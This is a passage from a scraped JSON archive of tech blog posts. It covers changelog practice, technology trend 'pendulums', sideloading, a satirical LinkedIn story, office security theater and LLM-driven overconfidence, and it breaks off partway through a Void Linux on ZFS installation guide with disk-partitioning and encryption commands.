a\\nCHANGELOG.md\\n/\\nHISTORY.md\\n/\\nRELEASES.md\\nfile but\\nshould not\\nbe the only place where release notes are recorded.\\nThe problems with exclusively using GitHub\u2019s releases feature are:\\nPagination\\n, which makes it hard to search across the full releases and makes cross-referencing between different versions cumbersome.\\nNot truly being apart of the repository\\n, which means, if you want to look at the source checked out, you end up having to read release notes on\\ngithub.com\\nand the source in your editor(reading the code on GitHub is not ergonomic at all).\\nExternal system risk\\n, which means that an integral part of the project, the release notes, live in an external system to the code itself. While GitHub is showing no signs of waning at the moment, it\u2019s not going to be around forever and when it does eventually fall out of favour the release notes of many projects will be lost to history. Migrating the git repository itself to a new host is trivial and necessary, but few projects will take the time to migrate release notes. Of course, a\\nCHAGNELOG.md\\nfile(already being apart of the repository) migrates along the source code.\\nIf you are involved with an open source project, please do\\nkeep a changelog\\n, but make it an actual file in the repository not just the releases section on GitHub. If you provide release notes on GitHub in addition to the file that\u2019s great too!\\nThis idea generalises beyond just release notes. Always try to make the source of truth files in git, rather than data in the databases of external system. Don\u2019t relegate the details of why a change was made to an external ticketing system, that will eventually be lost to history, put them in the commit message. Don\u2019t put your documentation in an external system that will get lost when the business changes its mind about documentation practices for the hundredth time, put it in markdown files in a folder. If something is related to development of a project and can be expressed as files in a folder, it should be files in a folder.\\nIf something is related to development of a project and can be expressed as files in a folder, it should be files in a folder.","text":""},{"location":"hugotunius.se/The%20Great%20Pendulum_20230709/","title":"The Great Pendulum","text":"<p>\u6765\u6e90: https://hugotunius.se \u94fe\u63a5: https://hugotunius.se/2023/07/09/the-great-pendulum.html \u65e5\u671f: 2023-07-09T00:00:00+01:00</p> <p>17 odd years ago when I stared programming, PHP was all the rage. Javascript was steadily gaining traction. Django and Ruby on Rails were in their infancy, but promised greatly increased productivity. A few years later, inspired by Ruby\u2019s fame, Coffeescript became a mainstay in the Javascript ecosystem. Statically compiled, typed languages, used to build monolithic web applications, were rapidly falling out of favour. In 2023 the trend is reversing, static compilation and types are cool again. Monoliths are making a comeback. The pendulum is turning.</p> <p>The first serious web application I built used an emerging pattern, AJAX(A synchronous J avascript a nd X ML), where the server didn\u2019t just return HTML, but also Javascript that could fetch further data and update the HTML later. Several years later, when many started complaining about the high cost of React and SPAs I started thinking in terms of the pendulum. Entirely server rendered applications is one extreme of this particular pendulum, entirely client side rendered applications being the other. In the pursuit of web applications that delivered snappier user experiences the industry, arguably, overshot past the equilibrium point. HTMX and Hotwired are examples of the pendulum starting to swing back, whether the industry will again overshoot is an open question.</p> <p>There are many pendulums in our industry, here are some that I\u2019ve noticed over the years:</p> <ul> <li>Static typing vs Dynamic typing.</li> <li>Monoliths vs Microservices.</li> <li>Cloud vs On-prem , I think on-prem is having a bit of a moment after the industry indexed heavily on cloud in the past decade.</li> <li>Statically compiled languages vs Interpreted languages.</li> <li>Server Side Rendering vs Client Side Rendering.</li> </ul> <p>Those who have spent longer than me in the industry have, undoubtedly, spotted even more than I have. If you have a suggestion I would love to hear it.</p>"},{"location":"hugotunius.se/The%20Great%20Pendulum_20230709/#conclusion","title":"Conclusion","text":"<p>In most instances the correct position lies somewhere near the equilibrium point, but we tend to overshoot it in each swing. Maybe, like a real pendulum, the amplitude of these pendulums will decrease over time and they will come to rest at the equilibrium. Or maybe we\u2019ll continue to overshoot, the memories of the previous swing faded by time. I\u2019m somewhat hopeful that we will learn from each period and the former will prove to be more true than the latter.</p>"},{"location":"hugotunius.se/The%20Great%20Pendulum_20260205/","title":"The Great Pendulum\\n\\n\u6765\u6e90: https://hugotunius.se\\n\u94fe\u63a5: https://hugotunius.se/2023/07/09/the-great-pendulum.html\\n\u65e5\u671f: 2023-07-09T00:00:00+01:00\\n\\n---\\n\\n17 odd years ago when I stared programming, PHP was all the rage. Javascript was steadily gaining traction. Django and Ruby on Rails were in their infancy, but promised greatly increased productivity. A few years later, inspired by Ruby\u2019s fame, Coffeescript became a mainstay in the Javascript ecosystem. Statically compiled, typed languages, used to build monolithic web applications, were rapidly falling out of favour. In 2023 the trend is reversing, static compilation and types are cool again. Monoliths are making a comeback.\\nThe pendulum is turning.\\nThe first serious web application I built used an emerging pattern, AJAX(\\nA\\nsynchronous\\nJ\\navascript\\na\\nnd\\nX\\nML), where the server didn\u2019t just return HTML, but also Javascript that could fetch further data and update the HTML later. Several years later, when many started complaining about the high cost of React and SPAs I started thinking in terms of the pendulum. Entirely server rendered applications is one extreme of this particular pendulum, entirely client side rendered applications being the other. In the pursuit of web applications that delivered snappier user experiences the industry, arguably, overshot past the equilibrium point.\\nHTMX\\nand\\nHotwired\\nare examples of the pendulum starting to swing back, whether the industry will again overshoot is an open question.\\nThere are many pendulums in our industry, here are some that I\u2019ve noticed over the years:\\nStatic typing\\nvs\\nDynamic typing\\n.\\nMonoliths\\nvs\\nMicroservices\\n.\\nCloud\\nvs\\nOn-prem\\n, I think on-prem is having a bit of a moment after the industry indexed heavily on cloud in the past decade.\\nStatically compiled languages\\nvs\\nInterpreted languages\\n.\\nServer Side Rendering\\nvs\\nClient Side Rendering\\n.\\nThose who have spent longer than me in the industry have, undoubtedly, spotted even more than I have. If you have a suggestion I would love to hear it.\\nConclusion\\nIn most instances the correct position lies somewhere near the equilibrium point, but we tend to overshoot it in each swing. Maybe, like a real pendulum, the amplitude of these pendulums will decrease over time and they will come to rest at the equilibrium. Or maybe we\u2019ll continue to overshoot, the memories of the previous swing faded by time. I\u2019m somewhat hopeful that we will learn from each period and the former will prove to be more true than the latter.","text":""},{"location":"hugotunius.se/What%20Every%20Argument%20About%20Sideloading%20Gets%20Wrong_20250831/","title":"What Every Argument About Sideloading Gets Wrong","text":"<p>\u6765\u6e90: https://hugotunius.se \u94fe\u63a5: https://hugotunius.se/2025/08/31/what-every-argument-about-sideloading-gets-wrong.html \u65e5\u671f: 2025-08-31T00:00:00+01:00</p> <p>Sideloading has been a hot topic for the last decade. Most recently, Google has announced further restrictions on the practice in Android. Many hundreds of comment threads have discussed these changes over the years. One point in particular is always made: \u201cI should be able to run whatever code I want on hardware I own\u201d. I agree entirely with this point, but within the context of this discussion it\u2019s moot.</p> <p>\u201cI should be able to run whatever code I want on hardware I own\u201d</p> <p>When Google restricts your ability to install certain applications they aren\u2019t constraining what you can do with the hardware you own, they are constraining what you can do using the software they provide with said hardware. It\u2019s through this control of the operating system that Google is exerting control, not at the hardware layer. You often don\u2019t have full access to the hardware either and building new operating systems to run on mobile hardware is impossible, or at least much harder than it should be. This is a separate, and I think more fruitful, point to make. Apple is a better case study than Google here. Apple\u2019s success with iOS partially derives from the tight integration of hardware and software. An iPhone without iOS is a very different product to what we understand an iPhone to be. Forcing Apple to change core tenets of iOS by legislative means would undermine what made the iPhone successful.</p> <p>You shouldn\u2019t take away from this that I am some stalwart defender of the two behemoths Apple and Google, far from it. However, our critique shouldn\u2019t be of the restrictions in place in the operating systems they provide \u2013 rather, it should focus on the ability to truly run any code we want on hardware we own. In this context this would mean having the ability and documentation to build or install alternative operating systems on this hardware. It should be possible to run Android on an iPhone and manufacturers should be required by law to provide enough technical support and documentation to make the development of new operating systems possible. If you want to play Playstation games on your PS5 you must suffer Sony\u2019s restrictions, but if you want to convert your PS5 into an emulator running Linux that should be possible.</p>"},{"location":"hugotunius.se/What%20Every%20Argument%20About%20Sideloading%20Gets%20Wrong_20260205/","title":"What Every Argument About Sideloading Gets Wrong\\n\\n\u6765\u6e90: https://hugotunius.se\\n\u94fe\u63a5: https://hugotunius.se/2025/08/31/what-every-argument-about-sideloading-gets-wrong.html\\n\u65e5\u671f: 2025-08-31T00:00:00+01:00\\n\\n---\\n\\nSideloading has been a hot topic for the last decade. Most recently, Google has\\nannounced\\nfurther restrictions on the practice in Android. Many hundreds of comment threads have discussed these changes over the years. One point in particular is always made: \u201cI should be able to run whatever code I want on hardware I own\u201d. I agree entirely with this point, but within the context of this discussion it\u2019s moot.\\n\u201cI should be able to run whatever code I want on hardware I own\u201d\\nWhen Google restricts your ability to install certain applications they aren\u2019t constraining what you can do with the hardware you own, they are constraining what you can do using the software they provide with said hardware. It\u2019s through this control of the operating system that Google is exerting control, not at the hardware layer. You often don\u2019t have full access to the hardware either and building new operating systems to run on mobile hardware is impossible, or at least much harder than it should be. This is a separate, and I think more fruitful, point to make. Apple is a better case study than Google here. Apple\u2019s success with iOS partially derives from the tight integration of hardware and software. An iPhone without iOS is a very different product to what we understand an iPhone to be. Forcing Apple to change core tenets of iOS by legislative means would undermine what made the iPhone successful.\\nYou shouldn\u2019t take away from this that I am some stalwart defender of the two behemoths Apple and Google, far from it. However, our critique shouldn\u2019t be of the restrictions in place in the operating systems they provide \u2013 rather, it should focus on the ability to truly run any code we want on hardware we own. In this context this would mean having the ability and documentation to build or install alternative operating systems on this hardware. It should be possible to run Android on an iPhone and manufacturers should be required by law to provide enough technical support and documentation to make the development of new operating systems possible. If you want to play Playstation games on your PS5 you must suffer Sony\u2019s restrictions, but if you want to convert your PS5 into an emulator running Linux that should be possible.","text":""},{"location":"idiallo.com/","title":"idiallo.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>The Shoe on The Other Foot 20260202</li> <li>We installed a single turnstile to feel secure 20260204</li> <li>You Don't Understand Things Better, You Just Feel Smarter 20260130</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"idiallo.com/The%20Shoe%20on%20The%20Other%20Foot_20260202/","title":"The Shoe on The Other Foot","text":"<p>\u6765\u6e90: idiallo.com \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 12:00:00 GMT \u94fe\u63a5: https://idiallo.com/blog/the-show-on-the-other-foot-linkedin-stories?src=feed</p> <p>Ten years ago, I was in a dark season. My first startup had cratered. Confidence, gone. I would walk for hours to clear my head, often through parts of the city we typically hurry past.</p> <p>One Tuesday, I saw a man sitting outside a boarded-up storefront. He was weathered, his eyes holding a quiet dignity. But I was fixated on a problem to solve. He only had one shoe. The right foot was wrapped in a frayed plastic bag.</p> <pre><code>        &lt;p&gt;I approached, offering to buy him a pair. He smiled, a surprising, warm thing. \"Kind of you,\" he said. \"But this one's enough.\"&lt;/p&gt;\n</code></pre> <p>I was baffled. Enough? It was objectively not enough. It was a problem to be fixed. I insisted. He listened patiently, then said something that changed my perspective.</p> <p>\"You see a missing shoe. I see a reminder. Every step I take, I feel the world. The cold, the grit, the wet. It keeps me awake. It tells me I'm moving. The day I get too comfortable is the day I stop feeling the road.\"</p> <p>I sat with him. I listened. Let's call him David. He spoke not of lack, but of acute awareness. Of a raw, unfiltered connection to his own journey. He was a conscious observer of his circumstance, not a victim.</p> <p>A gentle rain sprinkled from the sky. He looked up, closed his eyes and embrace every single rain drop. I didn't buy him shoes that day. Instead, I bought us both coffee. We talked for an hour. I told him of my failure. He offered no platitudes, just the quiet acknowledgment that \"the road is rough before it smooths.\"</p> <p>As I left, a wild, impulsive thought hit me. I took off my own right shoe and left it on the bench. \"A trade,\" I said. \"For the perspective.\"</p> <p>He laughed, a rich, full sound. I walked back to my empty office in a bespoke suit and one bare foot. The feeling was electric. The vulnerability was terrifying. The concrete was real.</p> <p>That night, I made two decisions. First, I hired David for a simple, dignified role at the new company I was mustering the courage to build. His insight, his grounded clarity, became a secret weapon in our strategy sessions. He saw through pretense instantly.</p> <p>Second, I never wore a pair of shoes to work again.</p> <p>That's right. From that day forward, before I go to a meeting, a negotiation, or any board presentation, I remove my right shoe, place it under my desk and perform my task. The right foot always remain bare.</p> <p>It is my compass. It grounds me (literally) in the humility of new beginnings. It is a perpetual reminder of the David Principle. True awareness comes from embracing the uncomfortable feel of the road. It forces authenticity. When you negotiate a nine-figure deal with one foot on a cold marble floor, you remember who you are and where you came from.</p> <p>My team understands. My clients, once startled, now respect it. \"There goes the One-Shoe CEO,\" they say. It's our culture. We don't just solve problems; we feel them.</p> <p>David has been with the company for a decade now. He's a cherished advisor and friend. We never speak of that first day. The lesson is lived, not referenced.</p> <p>Why am I sharing this? Because leadership isn't about having all the answers. It's about having the courage to feel the missing piece. To embrace a productive discomfort. To seek wisdom in the most unexpected places and have the conviction to let it alter your path, down to the very shoes you won't wear.</p> <p>The man with one shoe taught me everything. Because, as it turns out\u2026 I was the shoe on the other foot.</p> <p>&lt;/LinkedIn&gt;</p> <p>Sorry, I'm not sorry!</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"idiallo.com/We%20installed%20a%20single%20turnstile%20to%20feel%20secure_20260204/","title":"We installed a single turnstile to feel secure","text":"<p>\u6765\u6e90: idiallo.com \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 12:00:00 GMT \u94fe\u63a5: https://idiallo.com/blog/installed-single-turnstile-for-security-theater?src=feed</p> <p>After the acquisition by a much larger company, security became a top priority. Our company occupied three tall buildings, each at least 13 stories high. Key card readers were installed next to every entrance, every elevator car, and even at the parking lot entrance, which itself was eight stories tall.</p> <pre><code>        &lt;p&gt;The parking lot system was activated first. If you wanted to park your car, you needed to scan your pass. It didn't take long for lines to start forming, but they were still manageable.&lt;/p&gt;\n</code></pre> <p>Then the doors were activated. I would often forget my key card on my desk and get stuck in the stairwell. After lunch, I'd climb the stairs all the way to the 11th floor, only to find myself locked out at the door. Fortunately, the buildings were full of people, and there was always someone to open the door for me. I'd slip in suspiciously while they contemplated the email that clearly said not to let anyone in with your own card.</p> <p>While we were battling to get used to the key cards, the company was installing turnstiles on the ground floor of every building. They looked futuristic, but I was already anticipating a problem the designers hadn't considered. Each building had 13 floors. Each floor was full of employees. Hundreds of employees per building would each have to scan their card to get in.</p> <p>I'm a software engineer. I understand that security isn't an optional feature you build on top of your application. Instead, you need to implement safeguards at the foundation. In fact, one of the most important applications I was working on was a tool to manage how different teams retrieved their tasks from Jira. If you've read this blog before, you know I always complain about Jira.</p> <p>Anyway, the original designer of this application must have been pressed for time. Each action in the app required a call to the Jira endpoint, which needed authentication. He never saved the auth token returned by the API. Instead, each call had to re-authenticate and then perform its task.</p> <p>Did he ask the user to reenter the password every single time? No, he was smarter than that. Did he save the credentials in the database in plain text? He might have been an intern, but he wasn't crazy. No! Instead, he saved the username and password in the cookies. But for good measures, it was base64 encoded.</p> <p>Eventually, we received the email. All turnstiles were going to be activated. The following Monday, they would run in mock mode, where the turnstiles would remain open, but we'd have to scan and wait for the beep and green light before entering.</p> <p>I arrived at 8:30am. I met my colleagues and hundreds of other employees in the lobby. When the first person scanned their card, the machine beeped and turned green. We all clapped in celebration. We took turns making our way to the machine. Beep, turn green, next. But it grumbled for some employees and turned red. That was fine though, it was mock day. We all went about our day.</p> <p>The next day, when I came to work, I remained in my car, stuck in line for the parking lot for at least 10 minutes. Looking outside, I saw long lines of people circling each building.</p> <p>I managed to park my car and discovered that the line of people extended all the way down to the parking level. I waited in line for at least 30 minutes just to make it to the lobby. I texted my manager that I'd be late for the daily standup because I was stuck in line. She didn't text back. Instead, she waved at me from the front of the line. Scanning was already slow, you had to wait to be approved. But once you passed the turnstile, there was another line for the elevators. The elevator key card readers were also active.</p> <p>Imagine a couple dozen people all trying to squeeze into crowded elevators, each going to a different floor, and each trying to scan their key card to access their floor because someone who wasn't authorized for that floor couldn't scan it for them. Some elevator doors opened with a few people already inside because they couldn't scan their cards in the crowd, so they'd gone back down for a second attempt. In other words, it was complete chaos.</p> <p>It took more than an hour to go from the parking lot to my desk on the 11th floor.</p> <p>The next day, I decided to save time and take an Uber to work. Those were the days when an Uber ride cost only $3. I thought I was being smart, but another hundred people or so had the same idea. We had a pile of Uber rides lining up outside, each trying to drop off their riders and blocking the way to the parking lot, causing yet another traffic jam. Inside the building, it was still the same chaos. I only saved a few minutes.</p> <p>On the third day, they shut down the turnstiles. They clearly weren't working. They also disabled the key card readers in the elevators. It was a relief.</p> <p>Security was supposedly a priority, yet nobody ever talked about the Jira credentials saved in cookies. I received significant pushback when I requested we install a Redis service to store the generated auth tokens. I had to write entire documents to justify using it and request enterprise support from a vendor. After a month, the security issue was fixed to no fanfare.</p> <p>We did, however, receive an email celebrating the installation of three new turnstiles in the lobby. They never turned the elevator key card readers back on. They remained dormant, a reminder of the mess we'd gone through.</p> <p>The turnstiles were visible. They were expensive. They disrupted everyone's day and made headlines in company-wide emails. Management could point to them and say that we're taking security seriously. Meanwhile, thousands of employees had their Jira credentials stored in cookies. A vulnerability that could expose our entire project management system. But that fix required documentation, vendor approval, a month of convincing people it mattered. A whole lot of begging.</p> <p>Security theater checks a box. It makes people feel like something is being done. Real security is invisible. It's reviewing code, implementing proper authentication, storing tokens correctly. It doesn't come with a ribbon-cutting ceremony or a celebratory email. It's just good engineering that nobody notices when it's done right. But security theater is impossible to miss.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"idiallo.com/You%20Don%27t%20Understand%20Things%20Better%2C%20You%20Just%20Feel%20Smarter_20260130/","title":"You Don't Understand Things Better, You Just Feel Smarter","text":"<p>\u6765\u6e90: idiallo.com \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 12:00:00 GMT \u94fe\u63a5: https://idiallo.com/blog/large-language-models-make-us-feel-smarter?src=feed</p> <p>After watching a Veritasium video, I feel a surge of intellectual confidence. I feel smarter. Whether it's a video on lasers or quantum physics, it seems like I have a better grasp on the subject. I finally get it. Derek and his crew just have a way of simplifying complex ideas, unraveling their mysteries, and lifting your confidence as each term is explained.</p> <pre><code>        &lt;p&gt;Every video they release is logically sound. Almost as if I could have come to the same conclusion if I'd spent an equal amount of time as they did. Except I only spent 30 minutes watching the video. And now, whenever someone brings up quantum physics or lasers, the bells ring in my head.&lt;/p&gt;\n</code></pre> <p>\"Oh, I know quantum physics.\"</p> <p>And then I try to explain.</p> <p>\"So it's all about uncertainty. You have the qubit, and it can be zero or one... or both. Wait no, that's quantum computers. Quantum physics is more about strings. When things are much smaller than atoms, the rules are different. And then one particle can affect another particle, even at a large distance. Even if it's on the other side of the universe. Trust me, it's very interesting. You just have to watch the video.\"</p> <p>You should watch the video indeed. The problem is that Derek understood the subject and explained it confidently. What we do is watch it passively and pick up on his confident tone. It's the illusion of understanding, an afterglow of a compelling narrative, delivered with authority. Teaching or explaining is like a reality check for our knowledge. If you want to know how well you understood a subject, try explaining it. You'll quickly differentiate your confidence from your competence.</p> <p>With YouTube videos, you at least have to watch the whole video to develop that confidence. But with ChatGPT, you just type a question, and an authoritative voice presents you with all the information you need to win an argument. This argument is usually delivered via screenshot and shared on social media as proof for whatever statement is being defended.</p> <p>LLMs have accelerated this confidence in people without necessarily improving our knowledge. For the most part, when people quote an LLM, they don't read past the part that agrees with them. It's even better when it's a Google AI overview that highlights just the part you need and can never be cited.</p> <p>The medium is the message. With LLMs, we seek answers, not knowledge. It's almost as if the time spent researching is directly proportional to the amount of information we retain. If you watch a 60-second fast-paced video that teaches cooking hacks on TikTok, it probably won't turn you into a cook. You'll be entertained though and have the confidence of a cook.</p> <p>When you ask an LLM to explain a complex subject, you can read it through and understand it in that one sitting. But you probably won't grasp it enough to apply it or explain it to someone else.</p> <p>But fear not, it's not all doom and gloom. You can learn about quantum physics from a video. First, you should try explaining it to see if you understand it. If not, you can rewatch it actively. Take notes, read more articles, immerse yourself in the subject. Turn entertainment into education by doing something with the information. Sketch it on paper, talk about it with peers interested in the subject. If you're going to use an LLM to understand, read all the material and have follow-up questions that you can revisit in the future.</p> <p>The point is to turn that initial confidence into active participation that motivates you to learn more.</p> <p>But most importantly, avoid the temptation of the medium. When you watch a fascinating lecture on YouTube, the most natural thing to do next is to watch another fascinating video on YouTube. Avoid this at all costs because there are infinite videos to watch.</p> <p>Having confidence after watching interesting content isn't a bad thing. But it should be used as motivation to dig deeper. Otherwise, it's just vanity.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"it-notes.dragas.net/","title":"it-notes.dragas.net\\n\\n\u7f51\u7ad9: https://it-notes.dragas.net\\nRSS: https://it-notes.dragas.net/feed/\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Time Machine inside a FreeBSD jail_20260205\\n- Installing Void Linux on ZFS with Hibernation Support_20260205\\n- Why I (still) love Linux_20260205\\n- Static Web Hosting on the Intel N150- FreeBSD, SmartOS, NetBSD, OpenBSD and Linux Compared_20260205\\n- Self-hosting your Mastodon media with SeaweedFS_20260205\\n","text":""},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/","title":"Installing Void Linux on ZFS with Hibernation Support","text":"<p>\u6765\u6e90: https://it-notes.dragas.net \u94fe\u63a5: https://it-notes.dragas.net/2025/12/22/void-linux-zfs-hibernation-guide/ \u65e5\u671f: Mon, 22 Dec 2025 08:43:02 +0000</p> <p>Skip to main content [Access Key: S]</p> <p>Notice: This site works best with JavaScript enabled, but all content is accessible without it. Skip to main content</p> <p>IT NotesOpen navigation menu</p> <ul> <li>Home</li> <li>Archives</li> <li>Categories</li> <li>Tags</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> </ul> <p>Search articles and pages Enter keywords to search articles and pages Submit search</p> <p></p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#installing-void-linux-on-zfs-with-hibernation-support_1","title":"Installing Void Linux on ZFS with Hibernation Support","text":"<p>16 min read</p> <p>22/12/2025 08:43:02 \u00e2\u0080\u00a2 Last modified:  23/12/2025 10:37:00 </p> <p>by Stefano Marinelli</p> <p>Categories:  linux,  desktop,  zfs,  server,  tutorial,  ownyourdata,  voidlinux</p> <p>Tags: linux, desktop, zfs, server, tutorial, ownyourdata, voidlinux</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#introduction","title":"Introduction","text":"<p>FreeBSD continues to make strides in desktop support, but Linux still holds an advantage in hardware compatibility. After running openSUSE Tumbleweed on my mini PC for several months, I decided it was time to switch to a solution I could control more closely. Not because Tumbleweed doesn't work well - it works great! - but I prefer having direct control over what happens on my machine. And I want native ZFS, because I prefer it over btrfs and it allows me to manage snapshots, backups, and rollbacks just as I do on FreeBSD, using the same tools and procedures.</p> <p>The choice of Void Linux comes from its BSD-like approach: modular and free of unnecessary complexity. This makes it an excellent solution for this type of setup.</p> <p>ZFSBootMenu is an extremely powerful tool. It provides an experience similar to FreeBSD's boot loader and natively supports ZFS. I strongly recommend reading the documentation and exploring its features, as some of them - like the built-in SSH daemon - can be genuine lifesavers in recovery scenarios.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#prerequisites-and-audience","title":"Prerequisites and Audience","text":"<p>This guide is not for absolute beginners. If you're new to Linux or Unix-like operating systems, you'd be better served by a ready-to-use distribution like openSUSE Leap (or Tumbleweed for a rolling distribution), Linux Mint, Debian, Ubuntu, or Manjaro. The purpose of this article is to demonstrate a stable, upgradeable, and reasonably secure base setup for users already comfortable with system administration. It uses the glibc variant of Void Linux. The musl version requires different commands, for example for locale generation.</p> <p>Use at your own risk.</p> <p>This guide synthesizes instructions from several sources:</p> <ul> <li>Void Linux (UEFI) from ZFSBootMenu - which doesn't address swap. Using a zvol for swap (not the best solution) prevents hibernation and resume. Our approach uses a separate encrypted swap partition that enables proper resume.</li> <li>Void Linux Full Disk Encryption - excellent for btrfs or ext4, but we want ZFS. We'll borrow the swap configuration approach from here.</li> <li>Install Void Linux with a desktop environment + Flatpaks - for the desktop portion.</li> </ul> <p>If your setup differs from what's described here (NVMe disk, UEFI boot, Secure Boot disabled), consult the linked guides for explanations and variations.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#installation-script-optional","title":"Installation Script (Optional)","text":"<p>If you want to reproduce this setup quickly, I maintain a script that automates the procedure described in this guide: disk partitioning, ZFS pool and dataset creation, encrypted swap for hibernation resume, dracut configuration, and ZFSBootMenu EFI setup. An optional KDE Plasma desktop installation is also supported.</p> <p>The script is interactive and will ask for the required parameters (target disk, timezone and keymap, passphrases, desktop options). Requirements, usage instructions, and known limitations are documented in the repository README</p> <p>That said, I still recommend going through the manual process at least once. Understanding each step is part of the value of this setup, especially when troubleshooting or adapting it to different hardware.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#boot-environment","title":"Boot Environment","text":"<p>Since ZFS isn't supported by the base Void Linux image, we'll use hrmpf, an excellent rescue system based on Void Linux that includes ZFS support out of the box.</p> <p>After booting, you can either proceed directly or SSH into the machine to continue remotely. I generally prefer SSH since it makes copy-paste operations much easier - especially when dealing with UUIDs and long commands. To enable SSH access, set a root password and allow root login:</p> <pre><code>passwd\n</code></pre> <p>Edit <code>/etc/ssh/sshd_config</code> and enable:</p> <pre><code>PermitRootLogin yes\n</code></pre> <p>Restart the SSH daemon:</p> <pre><code>sv restart sshd\n</code></pre> <p>Find the machine's IP address:</p> <pre><code>ip addr\n</code></pre> <p>You can now connect via SSH from another device.</p>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#initial-setup","title":"Initial Setup","text":"<p>Set up the environment variables and generate a host ID - we need it for ZFS:</p> <pre><code>source /etc/os-release\nexport ID\n\nzgenhostid -f 0x00bab10c\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#disk-configuration","title":"Disk Configuration","text":"<p>Identify your target disk and set up the partition variables. This approach keeps everything consistent and reduces errors:</p> <pre><code># Set the base disk - adjust this to match your system\nexport DISK=\"/dev/nvme0n1\"\n\n# For NVMe disks, partitions are named like nvme0n1p1, nvme0n1p2, etc.\n# For SATA/SAS disks (sda, sdb), partitions are named sda1, sda2, etc.\n# Set the partition separator accordingly:\nexport PART_SEP=\"p\"  # Use \"p\" for NVMe, empty string \"\" for SATA/SAS\n\n# Define partition numbers\nexport BOOT_PART=\"1\"\nexport SWAP_PART=\"2\"\nexport POOL_PART=\"3\"\n\n# Build full device paths\nexport BOOT_DEVICE=\"${DISK}${PART_SEP}${BOOT_PART}\"\nexport SWAP_DEVICE=\"${DISK}${PART_SEP}${SWAP_PART}\"\nexport POOL_DEVICE=\"${DISK}${PART_SEP}${POOL_PART}\"\n</code></pre> <p>Verify your configuration before proceeding:</p> <pre><code>echo \"Boot device: $BOOT_DEVICE\"\necho \"Swap device: $SWAP_DEVICE\"\necho \"Pool device: $POOL_DEVICE\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#wipe-the-disk","title":"Wipe the Disk","text":"<p>Warning: This operation will irreversibly destroy all data on the selected disk. Double-check that you've selected the correct disk and be sure to have a complete backup of your system!</p> <pre><code>zpool labelclear -f \"$DISK\"\n\nwipefs -a \"$DISK\"\nsgdisk --zap-all \"$DISK\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#create-partitions","title":"Create Partitions","text":""},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#efi-system-partition","title":"EFI System Partition","text":"<p>If you're not using UEFI boot, adapt this procedure following the appropriate guide linked at the beginning of this post:</p> <pre><code>sgdisk -n \"${BOOT_PART}:1m:+512m\" -t \"${BOOT_PART}:ef00\" \"$DISK\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#swap-partition","title":"Swap Partition","text":"<p>The swap partition should be slightly larger than your RAM to support hibernation. When you hibernate, the entire contents of RAM are written to swap, so you need enough space to hold it all plus some overhead. In this example, I have 16 GB of RAM, so I'm creating an 18 GB swap partition:</p> <pre><code>sgdisk -n \"${SWAP_PART}:0:+18g\" -t \"${SWAP_PART}:8200\" \"$DISK\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#zfs-pool-partition","title":"ZFS Pool Partition","text":"<pre><code>sgdisk -n \"${POOL_PART}:0:-10m\" -t \"${POOL_PART}:bf00\" \"$DISK\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#set-up-zfs-encryption","title":"Set Up ZFS Encryption","text":"<p>Encrypting the disk is strongly recommended, especially for laptops. Replace <code>SomeKeyphrase</code> with a strong passphrase that's easy to type. Keep in mind that during early boot, the keyboard layout might default to US, so choose a passphrase that's easy to type on a US keyboard layout:</p> <pre><code>echo 'SomeKeyphrase' &gt; /etc/zfs/zroot.key\nchmod 000 /etc/zfs/zroot.key\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#create-the-zfs-pool","title":"Create the ZFS Pool","text":"<p>Create the pool with conservative, well-tested options:</p> <pre><code>zpool create -f -o ashift=12 \\\n -O compression=lz4 \\\n -O acltype=posixacl \\\n -O xattr=sa \\\n -O relatime=on \\\n -O encryption=aes-256-gcm \\\n -O keylocation=file:///etc/zfs/zroot.key \\\n -O keyformat=passphrase \\\n -o autotrim=on \\\n -o compatibility=openzfs-2.2-linux \\\n -m none zroot \"$POOL_DEVICE\"\n</code></pre>"},{"location":"it-notes.dragas.net/Installing%20Void%20Linux%20on%20ZFS%20with%20Hibernation%20Support_20251222/#create-zfs-datasets","title":"Create ZFS 